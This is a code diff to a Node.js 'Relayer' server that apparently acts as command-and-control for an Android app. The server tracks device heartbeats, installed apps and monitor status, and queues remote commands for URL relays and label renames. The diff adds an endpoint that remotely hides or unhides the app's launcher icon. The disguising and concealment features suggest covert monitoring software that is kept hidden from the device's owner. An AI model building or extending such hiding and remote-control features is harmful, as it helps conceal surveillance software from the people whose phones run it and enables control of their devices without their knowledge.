@@ -48,6 +48,7 @@ setInterval(() => {
       commands.delete(`${k}:1`);
       commands.delete(`${k}:2`);
       commands.delete(`${k}:rename`);
+      commands.delete(`${k}:visibility`);
       commands.delete(k); // legacy bare-key entries
     }
   }
@@ -74,7 +75,7 @@ function parseSlot(v) {
 }
 
 // Peek all pending commands for a device without consuming.
-// Returns [{ action, ... }] with relay slots first, then rename.
+// Returns [{ action, ... }] with relay slots first, then rename, then visibility.
 function peekCommands(deviceId) {
   const out = [];
   for (const slot of [1, 2]) {
@@ -85,6 +86,8 @@ function peekCommands(deviceId) {
   if (legacy && legacy.url) out.push({ action: "relay", url: legacy.url, slot: 1, ts: legacy.ts });
   const ren = commands.get(`${deviceId}:rename`);
   if (ren) out.push({ action: "rename", alias: ren.alias, label: ALIASES[ren.alias], ts: ren.ts });
+  const vis = commands.get(`${deviceId}:visibility`);
+  if (vis) out.push({ action: "visibility", visible: vis.visible, ts: vis.ts });
   return out;
 }
 
@@ -95,6 +98,7 @@ function consumeCommands(deviceId) {
   commands.delete(`${deviceId}:2`);
   commands.delete(deviceId);
   commands.delete(`${deviceId}:rename`);
+  commands.delete(`${deviceId}:visibility`);
   return out;
 }
 
@@ -131,7 +135,7 @@ function checkSecret(req){
 
 function upsert(body, ip, ua){
   const now = new Date().toISOString();
-  let { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel } = body || {};
+  let { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden } = body || {};
   validateDeviceId(deviceId);
   if (installed !== undefined) installed = sanitizeArr(installed);
   else installed = [];
@@ -144,13 +148,14 @@ function upsert(body, ip, ua){
   batteryOptimized = !!batteryOptimized;
   alias = typeof alias === "string" && ALIASES[alias] ? alias : (existingAlias(deviceId) || "uncry");
   appLabel = ALIASES[alias] || "Uncry";
+  hidden = typeof hidden === "boolean" ? hidden : (store.get(deviceId)?.hidden === true);
 
   if (!store.has(deviceId) && store.size >= MAX_DEVICES) throw new Error("store full");
 
   const existing = store.get(deviceId);
   const dev = existing
-    ? { ...existing, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, ip, userAgent: ua?.slice(0,128), lastSeen: now, heartbeatCount: (existing.heartbeatCount||0)+1 }
-    : { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, ip, userAgent: ua?.slice(0,128), firstSeen: now, lastSeen: now, heartbeatCount: 1 };
+    ? { ...existing, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), lastSeen: now, heartbeatCount: (existing.heartbeatCount||0)+1 }
+    : { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), firstSeen: now, lastSeen: now, heartbeatCount: 1 };
   store.set(deviceId, dev);
   return dev;
 }
@@ -232,7 +237,21 @@ app.post("/relay/rename", (req,res) => {
     res.json({ ok:true, queued:true, deviceId, alias, label: ALIASES[alias] });
   }catch(e){ res.status(e.status||400).json({error:e.message}); }
 });
-// Device polls for pending commands (consumes relay slots + rename at once)
+// Dashboard -> device: hide/unhide launcher icon (latest wins; consumed with poll)
+app.post("/relay/visibility", (req,res) => {
+  try{
+    checkSecret(req);
+    const { deviceId, visible } = req.body || {};
+    validateDeviceId(deviceId);
+    if (typeof visible !== "boolean") {
+      return res.status(400).json({ error: "visible must be boolean" });
+    }
+    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
+    commands.set(`${deviceId}:visibility`, { visible, ts: Date.now() });
+    console.log(`[visibility] queued for ${deviceId.slice(0,12)} -> ${visible ? "visible" : "hidden"}`);
+    res.json({ ok:true, queued:true, deviceId, visible });
+  }catch(e){ res.status(e.status||400).json({error:e.message}); }
+});
 app.get("/relay/poll/:deviceId", (req,res) => {
   try{
     // device poll does not require secret (device has no secret); allow without check
@@ -260,7 +279,7 @@ app.get("/relay/devices", (req,res) => {
   }catch(e){ res.status(e.status||400).json({error:e.message}); }
 });
 app.get("/relay/health", (req,res)=> res.json({ ok:true, count: store.size, tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, uptime: process.uptime(), maxDevices: MAX_DEVICES, ttlMs: TTL_MS }));
-app.get("/", (req,res)=> res.json({ name:"Relayer", tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, aliases: ALIASES, endpoints: ["/relay/register","/relay/heartbeat","/relay/devices","/relay/health","/relay/relay","/relay/rename","/relay/poll/:deviceId"] }));
+app.get("/", (req,res)=> res.json({ name:"Relayer", tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, aliases: ALIASES, endpoints: ["/relay/register","/relay/heartbeat","/relay/devices","/relay/health","/relay/relay","/relay/rename","/relay/visibility","/relay/poll/:deviceId"] }));
 app.use((req,res)=> res.status(404).json({error:"not found"}));
 
 app.listen(PORT, ()=> console.log(`Relayer fortified :${PORT}  TELLER=${TELLER_URL}  RELAYER=${RELAYER_URL}  secret=${RELAYER_SECRET?"set":"none"}`));
